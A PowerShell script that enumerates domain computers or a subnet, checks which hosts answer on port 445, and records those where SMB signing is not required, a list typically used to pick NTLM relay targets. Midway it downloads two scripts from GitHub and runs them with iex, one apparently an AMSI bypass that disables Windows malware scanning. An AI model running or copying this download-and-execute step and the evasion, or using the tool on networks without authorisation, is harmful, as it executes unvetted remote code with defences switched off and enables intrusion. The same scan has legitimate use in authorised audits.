function CheckSMBSigning
{
	[CmdletBinding()] Param(
		
		[Parameter (Mandatory=$False, Position = 0, ValueFromPipeline=$true)]
		[String]
		$Targets,

  		[Parameter (Mandatory=$False, Position = 1, ValueFromPipeline=$true)]
		[String]
		$Domain,

  		[Parameter (Mandatory=$False, Position = 2, ValueFromPipeline=$true)]
		[String]
		$OutputFile
	)
	
	Write-Output ""
	
	$ErrorActionPreference = "SilentlyContinue"
	
	Write-Output " Checking Hosts..."

 	if($Targets){
  		if ($Targets -match "/") {
			$split = $Targets.Split("/")
			$ipBase = $split[0]
			$maskBits = [int]$split[1]

			$ips = Get-SubnetAddresses -MaskBits $maskBits -IP $ipBase

			$Computers = @(Get-IPRange -Lower $ips[0] -Upper $ips[1])
		}
		else{
			$Computers = $Targets
			$Computers = $Computers -split ","
		}
	}
  	else{
		if($Domain){
  			$objSearcher = New-Object System.DirectoryServices.DirectorySearcher
			$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain")
   			$objSearcher.PageSize = 1000
			$objSearcher.Filter = "(&(sAMAccountType=805306369))"
			$Computers = $objSearcher.FindAll() | %{$_.properties.dnshostname}
		}

    		else{
			# Get a list of all the computers in the domain
			$objSearcher = New-Object System.DirectoryServices.DirectorySearcher
			$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry
   			$objSearcher.PageSize = 1000
			$objSearcher.Filter = "(&(sAMAccountType=805306369))"
			$Computers = $objSearcher.FindAll() | %{$_.properties.dnshostname}
			
			$currentdomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }
			$Computers = $Computers | Where-Object {-not ($_ -cmatch "$env:computername")}
			$Computers = $Computers | Where-Object {-not ($_ -match "$env:computername")}
			$Computers = $Computers | Where-Object {$_ -ne "$env:computername"}
			$Computers = $Computers | Where-Object {$_ -ne "$env:computername.$currentdomain"}
  		}

 	}

  	$Computers = $Computers | Where-Object { $_ -and $_.trim() }
	
	# Initialize the runspace pool
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
        $runspacePool.Open()

        # Define the script block outside the loop for better efficiency
        $scriptBlock = {
            param ($computer)
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($computer, 445, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
            if ($wait) {
                try {
                    $tcpClient.EndConnect($asyncResult)
                    return $computer
                } catch {}
            }
            $tcpClient.Close()
            return $null
        }

        # Use a generic list for better performance when adding items
        $runspaces = New-Object 'System.Collections.Generic.List[System.Object]'

        foreach ($computer in $Computers) {
            $powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer)
            $powerShellInstance.RunspacePool = $runspacePool
            $runspaces.Add([PSCustomObject]@{
                Instance = $powerShellInstance
                Status   = $powerShellInstance.BeginInvoke()
            })
        }

        # Collect the results
        $reachable_hosts = @()
        foreach ($runspace in $runspaces) {
            $result = $runspace.Instance.EndInvoke($runspace.Status)
            if ($result) {
                $reachable_hosts += $result
            }
        }

        # Update the $Computers variable with the list of reachable hosts
        $Computers = $reachable_hosts

        # Close and dispose of the runspace pool for good resource management
        $runspacePool.Close()
        $runspacePool.Dispose()
	
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-SMBSigning.ps1')
	
	# foreach($reachable_host in $reachable_hosts){Invoke-SMBEnum -Target $reachable_host -Action All}
	
	if($reachable_hosts.Count -eq 1) {
		$smbsigningnotrequired = Get-SMBSigning -DelayJitter 10 -Target $reachable_hosts | Select-String "SMB signing is not required"
		$smbsigningnotrequired = ($smbsigningnotrequired | Out-String) -split "`n"
		$smbsigningnotrequired = $smbsigningnotrequired.Trim()
		$smbsigningnotrequired = $smbsigningnotrequired | Where-Object { $_ -ne "" }
		$smbsigningnotrequired = $smbsigningnotrequired | ForEach-Object { $_.ToString().Replace("SMB signing is not required on ", "") }
	}
	
	else{
		$formatted_hosts = '"' + ($reachable_hosts -join '","') + '"'
		$smbsigningnotrequired = Invoke-Expression "Get-SMBSigning -DelayJitter 10 -Targets @($formatted_hosts)" | Select-String "SMB signing is not required"
		$smbsigningnotrequired = ($smbsigningnotrequired | Out-String) -split "`n"
		$smbsigningnotrequired = $smbsigningnotrequired.Trim()
		$smbsigningnotrequired = $smbsigningnotrequired | Where-Object { $_ -ne "" }
		$smbsigningnotrequired = $smbsigningnotrequired | ForEach-Object { $_.ToString().Replace("SMB signing is not required on ", "") }
	}

 	if($smbsigningnotrequired){

  		if(!$OutputFile){$OutputFile = "$pwd\SMBSigningNotRequired.txt"}
			
		$utf8NoBom = New-Object System.Text.UTF8Encoding $false
		[System.IO.File]::WriteAllLines($OutputFile, $smbsigningnotrequired, $utf8NoBom)
		
		Write-Output ""
		Write-Output " SMB Signing not required:"
		Write-Output ""
		$smbsigningnotrequired
		Write-Output ""
		if($OutputFile){Write-Output " Output saved to: $OutputFile"}
  		else{Write-Output " Output saved to: $pwd\SMBSigningNotRequired.txt"}
		Write-Output ""
  	}

    	else{
     		Write-Output " No hosts found where SMB-Signing is not required."
	  	Write-Output ""
	}
}

function Get-SubnetAddresses {
    Param (
        [IPAddress]$IP,
        [ValidateRange(0, 32)][int]$MaskBits
    )

    $mask = ([Math]::Pow(2, $MaskBits) - 1) * [Math]::Pow(2, (32 - $MaskBits))
    $maskbytes = [BitConverter]::GetBytes([UInt32] $mask)
    $DottedMask = [IPAddress]((3..0 | ForEach-Object { [String] $maskbytes[$_] }) -join '.')

    $lower = [IPAddress] ( $ip.Address -band $DottedMask.Address )

    $LowerBytes = [BitConverter]::GetBytes([UInt32] $lower.Address)
    [IPAddress]$upper = (0..3 | % { $LowerBytes[$_] + ($maskbytes[(3 - $_)] -bxor 255) }) -join '.'

    $ips = @($lower, $upper)
    return $ips
}

function Get-IPRange {
    param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [System.Net.IPAddress]$Lower,

        [Parameter(Mandatory = $true)]
        [ValidateNotNull()]
        [System.Net.IPAddress]$Upper
    )

    $IPList = [Collections.ArrayList]::new()
    $null = $IPList.Add($Lower)
    $i = $Lower
    while ( $i -ne $Upper ) { 
        $iBytes = [BitConverter]::GetBytes([UInt32] $i.Address)
        [Array]::Reverse($iBytes)
        $nextBytes = [BitConverter]::GetBytes([UInt32]([bitconverter]::ToUInt32($iBytes, 0) + 1))
        [Array]::Reverse($nextBytes)
        $i = [IPAddress]$nextBytes
        $null = $IPList.Add($i)
    }
    return $IPList.IPAddressToString
}
